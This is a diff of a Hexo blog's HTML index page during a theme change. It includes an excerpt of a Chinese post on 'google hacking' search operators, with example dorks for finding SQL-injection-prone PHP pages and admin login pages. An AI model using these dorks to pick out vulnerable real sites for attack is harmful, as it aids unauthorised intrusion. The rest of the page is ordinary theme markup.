-        <time datetime="2016-07-18T12:07:37.000Z"><a href="/2016/07/18/google-hacking/">2016-07-18</a></time>
-      
-      
+    <article id="post-google-hacking" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/18/google-hacking/" class="article-date">
+  <time datetime="2016-07-18T12:07:37.000Z" itemprop="datePublished">2016-07-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/18/google-hacking/">google hacking</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/18/google-hacking/">google hacking</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <h1 id="高级搜索符"><a href="#高级搜索符" class="headerlink" title="高级搜索符"></a>高级搜索符</h1><p>intitle allintitle 页面标题里查找关键字<br>filetye 查找指定文件类型<br>site 锁定站点<br>inurl allinurl 在url中查找关键字<br>intext allintext 网页查找关键字<br>link 搜索链接到某个网站的连接<br>排除字域名<br>site:baidu.com -site:www.baidu,com<br>site:video.baidu.com<br>实例：sql注入页面<br>site:tw inurl:?id=1..10000000 filetype:php<br>管理员登录界面：intitle:”后台登录”</p>
 <ul>
@@ -548,81 +638,127 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/18/google-hacking/" data-id="cirh0pzph0003s4hrh30jdbnh" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
+  
 
 
-
-<nav id="pagination">
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><a class="extend next" rel="next" href="page/2/">__('next') &raquo;</a>
+  </nav>
+</section>
+        
+          <aside id="sidebar">
   
-  
-    <a href="/page/2/" class="alignright next">Siguiente</a>
-  
-  <div class="clearfix"></div>
-</nav></div></div>
-    <aside id="sidebar" class="alignright">
-  <div class="search">
-  <form action="//google.com/search" method="get" accept-charset="utf-8">
-    <input type="search" name="q" results="0" placeholder="Buscar">
-    <input type="hidden" name="q" value="site:yoursite.com">
-  </form>
-</div>
-
-  
-<div class="widget tag">
-  <h3 class="title">Categorías</h3>
-  <ul class="entry">
-  
-    <li><a href="/categories/WEB/">WEB</a><small>2</small></li>
-  
-  </ul>
-</div>
-
-
-  
-<div class="widget tag">
-  <h3 class="title">Etiquetas</h3>
-  <ul class="entry">
-  
-    <li><a href="/tags/代码执行/">代码执行</a><small>1</small></li>
-  
-    <li><a href="/tags/文件包含/">文件包含</a><small>1</small></li>
-  
-  </ul>
-</div>
-
-</aside>
-    <div class="clearfix"></div>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="categories/WEB/">WEB</a></li></ul>
+    </div>
   </div>
-  <footer id="footer" class="inner"><div class="alignleft">
+
+
   
-  &copy; 2016 liuqi
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/代码执行/">代码执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>
+    </div>
+  </div>
+
+
   
-</div>
-<div class="clearfix"></div></footer>
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-<script src="/js/jquery.imagesloaded.min.js"></script>
-<script src="/js/gallery.js"></script>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="tags/代码执行/" style="font-size: 10px;">代码执行</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/05/">May 2016</a></li></ul>
+    </div>
+  </div>
 
 
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="2016/08/04/逻辑漏洞/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="2016/08/01/敏感信息泄露/">敏感信息泄露</a>
+          </li>
+        
+          <li>
+            <a href="2016/07/30/文件包含漏洞/">文件包含漏洞</a>
+          </li>
+        
+          <li>
+            <a href="2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="2016/07/29/命令执行漏洞/">命令执行漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 liuqi<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-<script type="text/javascript">
-(function($){
-  $('.fancybox').fancybox();
-})(jQuery);
-</script>
+  <link rel="stylesheet" href="fancybox/jquery.fancybox.css">
+  <script src="fancybox/jquery.fancybox.pack.js"></script>
 
+
+<script src="js/script.js"></script>
+
+  </div>
 </body>
 </html>
